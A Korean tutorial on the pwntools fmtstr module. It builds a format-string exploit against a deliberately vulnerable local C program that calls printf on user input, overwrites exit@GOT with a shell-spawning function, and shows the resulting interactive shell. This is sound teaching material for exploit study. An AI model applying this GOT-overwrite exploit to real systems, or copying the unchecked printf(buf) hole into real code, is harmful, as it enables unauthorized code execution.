pwntools - fmtstr :
    포맷 스트링 버그는 출력한 바이트의 개수와 덮어쓸 값을 연산해서 코드를 작성해야 하기 때문에 익스플로잇하는 데에 시간이 오래 걸리고 번거롭습니다.

    fmtstr은 연산이 필요없이 주소와 값을 입력하면 해당 주소를 덮어쓸 수 있도록 코드를 작성할 수 있습니다.

    fmt.c는 256 바이트를 버퍼에 입력하고 포맷 스트링 버그가 발생하는 코드입니다.
    ex)
        // gcc -o fmt fmt.c -m32
        #include <stdio.h>
        #include <unistd.h>
        #include <stdlib.h>
        void giveshell() {
            system("/bin/sh");
        }
        int main()
        {
            char buf[256];
            read(0, buf, 256);
            printf(buf);
            
            exit(0);
        }

    exit@got를 giveshell 함수 주소로 덮으면 셸을 획득할 수 있습니다.
    
    먼저, fmtstr은 익스플로잇 코드를 작성하기 전에 데이터를 보낼 함수와 printf 함수를 호출할 때의 esp로 부터 떨어진 인덱스 값을 인자로 주어야 합니다.

    fmt.c의 경우 7 번째에 사용자가 입력한 값이 출력되었습니다.
    ex)
        $ ./fmt
        AAAA.%x.%x.%x.%x.%x.%x.%x
        AAAA.ff950ddc.100.0.f7f4c000.804827e.f63d4e2e.41414141

    그렇다면 다음과 같은 코드로 fmt 변수에 객체를 할당할 수 있습니다.
    ex)
        def send_payload(payload):
            print p.sendline(payload)
        fmt = FmtStr(send_payload, offset=7)

    원하는 주소에 값을 쓰기 위해서는 write 함수의 첫 번째 인자로 주소를 전달하고, 두 번째 인자에 덮어 쓸 값을 전달하면 됩니다.
    ex)
        exit_got = elf.got['exit']
        giveshell = elf.symbols['giveshell']
        fmt.write(exit_got,giveshell)

    익스플로잇 코드가 작성된 상태에서 send_payload 함수를 통해 데이터를 보내기 위해서는 execute_writes 함수를 호출해야 합니다.
    ex)
        fmt.execute_writes()

    fmt.py를 실행하면 작성된 포맷 스트링 버그 익스플로잇 코드가 send_payload 함수를 통해 입력되어 셸을 획득할 수 있습니다.
    ex)
        # fmt.py
        from pwn import *
        
        context.arch = 'x86'
        
        def send_payload(payload):
            print p.sendline(payload)
        
        p = process("./fmt")
        elf = ELF('./fmt')
        
        exit_got = elf.got['exit']
        giveshell = elf.symbols['giveshell']
        fmt = FmtStr(send_payload, offset=7)
        
        fmt.write(exit_got,giveshell)
        
        fmt.execute_writes()
        p.interactive()

    ex)
        $ python fmt.py
        [+] Starting local process './fmt': pid 65741
        [*] '/home/theori/fmt'
            Arch:     i386-32-little
            RELRO:    Partial RELRO
            Stack:    No canary found
            NX:       NX enabled
            PIE:      No PIE (0x8048000)
        None
        [*] Switching to interactive mode
        \x18\xa0\x0\x19\xa0\x0\x1a\xa0\x0\x1b\xa0\x0                                 
                                                                                                                 \xac                      
                                                                                                                 
                                     
                                                                                          
                    \x00                                                                                             
                \x00   \x00
        $ id
        uid=1001(theori) gid=1001(theori) groups=1001(theori)
























